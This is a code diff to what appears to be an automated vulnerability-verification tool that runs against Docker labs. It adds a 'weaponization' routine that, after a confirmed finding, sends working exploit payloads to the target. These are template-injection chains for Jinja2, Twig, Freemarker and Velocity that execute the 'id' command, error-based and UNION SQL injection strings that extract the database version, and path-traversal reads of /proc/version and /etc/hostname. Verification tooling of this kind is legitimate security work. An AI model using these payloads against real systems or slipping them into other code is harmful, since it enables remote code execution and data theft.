@@ -7485,6 +7485,193 @@ def verify_generic_cors_misconfig(
         lab.teardown()
 
 
+# ---------------------------------------------------------------------------
+# Post-verification weaponization for generic HTTP confirm verifier
+# ---------------------------------------------------------------------------
+
+def _try_weaponize_generic(
+    base_url: str, endpoint: str, method: str,
+    query_params: Optional[dict], post_data: Optional[dict],
+    hdrs: dict, confirm_string: str, vuln_class: str,
+    step: Callable,
+) -> dict:
+    """After HTTP confirm succeeds, attempt to extract impact evidence.
+
+    Strategies by vuln_class:
+    - ssti / template-injection: replace math payload with id-exec payload
+    - sql-injection / sqli: try version() extraction via error-based payload
+    - path-traversal / lfi / arbitrary-file-read: try /proc/version read
+    Returns a dict with 'technique', 'data', 'impact' — empty if nothing lands.
+    Never raises.
+    """
+    _vc = (vuln_class or "").lower().replace("_", "-")
+    result: dict = {"technique": "none", "data": {}, "impact": ""}
+    try:
+        import requests as _req
+        sess = _req.Session()
+
+        def _send_weap(params_override: dict = None, data_override: dict = None,
+                       new_ep: str = None) -> str:
+            ep = new_ep or endpoint
+            url = base_url.rstrip("/") + "/" + ep.lstrip("/")
+            kw: dict = {"timeout": 12, "headers": hdrs or {}, "allow_redirects": True}
+            if method.upper() == "GET":
+                kw["params"] = params_override or query_params or {}
+            else:
+                _ct = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
+                payload = data_override or post_data or {}
+                if "application/json" in _ct:
+                    kw["json"] = payload
+                else:
+                    kw["data"] = payload
+            r = sess.request(method.upper(), url, **kw)
+            return r.text if hasattr(r, "text") else ""
+
+        # --- SSTI / Template injection ---
+        if _vc in ("ssti", "template-injection", "server-side-template-injection",
+                   "code-injection"):
+            # Find which parameter held the SSTI confirm payload (math expr)
+            _all_params = dict(query_params or {})
+            _all_params.update(post_data or {})
+            _ssti_param = None
+            _ssti_val = None
+            for k, v in _all_params.items():
+                if isinstance(v, str) and any(x in v for x in ("{{", "${", "<%=")):
+                    _ssti_param = k
+                    _ssti_val = v
+                    break
+            if _ssti_param:
+                # Jinja2 / Twig / generic: try to get id output via os.popen
+                _rce_payloads = [
+                    # Jinja2 (Python) — typical exploit chain
+                    ("{{''.__class__.__mro__[1].__subclasses__()[-1].__init__.__globals__"
+                     "['__builtins__']['__import__']('os').popen('id').read()}}"),
+                    # Twig (PHP) shorthand
+                    "{{['id'] | filter('system')}}",
+                    # Freemarker (Java)
+                    '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
+                    # Velocity (Java)
+                    "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))"
+                    "#set($chr=$x.class.forName(\"java.lang.Character\"))"
+                    "#set($str=$x.class.forName(\"java.lang.String\"))"
+                    "#set($ex=$rt.getRuntime().exec(\"id\"))$ex.waitFor()",
+                ]
+                step("weaponize/ssti: probando payloads de ejecucion de comandos...")
+                for payload in _rce_payloads:
+                    p_override = {_ssti_param: payload}
+                    if method.upper() == "GET":
+                        body_w = _send_weap(params_override=p_override)
+                    else:
+                        body_w = _send_weap(data_override=dict(post_data or {}, **p_override))
+                    import re as _re
+                    uid_m = _re.search(r'uid=\d+\(([^\)]+)\)', body_w)
+                    if uid_m:
+                        step(f"weaponize/ssti: RCE confirmado — uid={uid_m.group(0)}")
+                        return {
+                            "technique": "ssti_rce",
+                            "data": {"uid_output": uid_m.group(0), "payload": payload[:80]},
+                            "impact": f"RCE via SSTI — OS command output: {uid_m.group(0)}",
+                        }
+
+        # --- SQL injection: extract DB version ---
+        elif _vc in ("sqli", "sql-injection", "blind-sql-injection", "error-based-sqli"):
+            _all_params = dict(query_params or {})
+            _all_params.update(post_data or {})
+            _sq_param = None
+            for k, v in _all_params.items():
+                if isinstance(v, str) and any(x in v for x in
+                                               ("'", '"', "UNION", "union", "SELECT", "--")):
+                    _sq_param = k
+                    break
+            if not _sq_param and _all_params:
+                _sq_param = next(iter(_all_params))
+            if _sq_param:
+                _ver_payloads = [
+                    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
+                    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),"
+                    "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+                    "1' UNION SELECT NULL,version()-- -",
+                    "1' UNION SELECT version(),NULL-- -",
+                    "1 AND 1=(SELECT version())",
+                    "' || (SELECT version()) || '",
+                ]
+                step("weaponize/sqli: extrayendo version de base de datos...")
+                import re as _re
+                for vp in _ver_payloads:
+                    p_override = {_sq_param: vp}
+                    if method.upper() == "GET":
+                        body_w = _send_weap(params_override=dict(_all_params, **p_override))
+                    else:
+                        body_w = _send_weap(data_override=dict(_all_params, **p_override))
+                    ver_m = _re.search(
+                        r'(?:~|~>|XPATH syntax error:\'~?)([0-9]+\.[0-9]+\.[^\s<"&\']{1,50})',
+                        body_w)
+                    if not ver_m:
+                        # PostgreSQL: "invalid input syntax" with version in hint
+                        ver_m = _re.search(r'PostgreSQL [\d.]+ on [^\s<"&]{5,80}', body_w)
+                    if not ver_m:
+                        # Generic version pattern
+                        ver_m = _re.search(r'(?:MySQL|MariaDB|PostgreSQL|SQLite|MSSQL)'
+                                           r'[^\s<"&]{0,10} [\d.]+', body_w, _re.IGNORECASE)
+                    if ver_m:
+                        db_ver = ver_m.group(0).strip("~>")
+                        step(f"weaponize/sqli: version extraida — {db_ver}")
+                        return {
+                            "technique": "sqli_version",
+                            "data": {"db_version": db_ver, "payload": vp[:60]},
+                            "impact": f"SQLi confirmed — DB version extracted: {db_ver}",
+                        }
+
+        # --- Path traversal / LFI: read /proc/version ---
+        elif _vc in ("path-traversal", "lfi", "arbitrary-file-read",
+                     "directory-traversal", "file-inclusion"):
+            _all_params = dict(query_params or {})
+            _all_params.update(post_data or {})
+            # Already confirmed /etc/passwd or similar — also fetch /proc/version for more context
+            _lfi_param = None
+            for k, v in _all_params.items():
+                if isinstance(v, str) and any(x in v for x in
+                                               ("..", "etc", "passwd", "proc", "%2e")):
+                    _lfi_param = k
+                    break
+            if _lfi_param:
+                _extra_files = [
+                    "../../../../../../../../proc/version",
+                    "../../../../../../../../etc/hostname",
+                    "../../../../../../../../etc/os-release",
+                ]
+                import re as _re
+                step("weaponize/lfi: leyendo archivos del sistema adicionales...")
+                for fp in _extra_files:
+                    fname = fp.rsplit("/", 1)[-1]
+                    p_override = {_lfi_param: fp}
+                    if method.upper() == "GET":
+                        body_w = _send_weap(params_override=dict(_all_params, **p_override))
+                    else:
+                        body_w = _send_weap(data_override=dict(_all_params, **p_override))
+                    if fname == "version" and ("Linux version" in body_w or "gcc" in body_w):
+                        kver_m = _re.search(r'Linux version [\d.]+[^\n<]{0,80}', body_w)
+                        kver = kver_m.group(0) if kver_m else body_w[:100]
+                        step(f"weaponize/lfi: kernel version — {kver[:60]}")
+                        return {
+                            "technique": "lfi_kernel",
+                            "data": {"kernel_version": kver, "file": "/proc/version"},
+                            "impact": f"LFI confirmed — kernel version: {kver[:60]}",
+                        }
+                    elif fname == "hostname" and body_w.strip():
+                        hostname = body_w.strip()[:64]
+                        step(f"weaponize/lfi: hostname extraido — {hostname}")
+                        return {
+                            "technique": "lfi_hostname",
+                            "data": {"hostname": hostname, "file": "/etc/hostname"},
+                            "impact": f"LFI confirmed — hostname: {hostname}",
+                        }
+
+    except Exception as _we:
+        step(f"weaponize: error inesperado — {type(_we).__name__}: {_we}")
+    return result
+
+
 def verify_generic_http_confirm(
     source_dir: str, endpoint: str, http_method: str = "GET",
     confirm_string: str = "", patched_patterns: Optional[List[str]] = None,
@@ -7496,6 +7683,7 @@ def verify_generic_http_confirm(
     setup_wait_extra_s: float = 0.0,
     setup_commands: Optional[List[str]] = None,
     docker_image: str = "",
+    vuln_class: str = "",
 ) -> WpVerifyResult:
     """Verificador generico de string de confirmacion en respuesta HTTP.
 
@@ -7596,6 +7784,15 @@ def verify_generic_http_confirm(
                 caption_en=(f"VULNERABILITY CONFIRMED: '{confirm_string}' found in "
                             f"response of {m} {endpoint}."),
             )
+            if vuln_class:
+                _wep = _try_weaponize_generic(
+                    base_url=base_url, endpoint=endpoint, method=m,
+                    query_params=query_params, post_data=post_data,
+                    hdrs=hdrs, confirm_string=confirm_string,
+                    vuln_class=vuln_class, step=step,
+                )
+                if _wep.get("impact"):
+                    res.evidence["weaponization"] = _wep
             return res
 
         # First attempt failed — try up to 2 endpoint format variants without Docker rebuild.
@@ -7638,6 +7835,15 @@ def verify_generic_http_confirm(
                         caption_es=(f"VULNERABILIDAD CONFIRMADA: '{confirm_string}' en {m} {_alt_ep}."),
                         caption_en=(f"VULNERABILITY CONFIRMED: '{confirm_string}' in {m} {_alt_ep}."),
                     )
+                    if vuln_class:
+                        _wep = _try_weaponize_generic(
+                            base_url=base_url, endpoint=_alt_ep, method=m,
+                            query_params=query_params, post_data=post_data,
+                            hdrs=hdrs, confirm_string=confirm_string,
+                            vuln_class=vuln_class, step=step,
+                        )
+                        if _wep.get("impact"):
+                            res.evidence["weaponization"] = _wep
                     return res
             except Exception:
                 pass
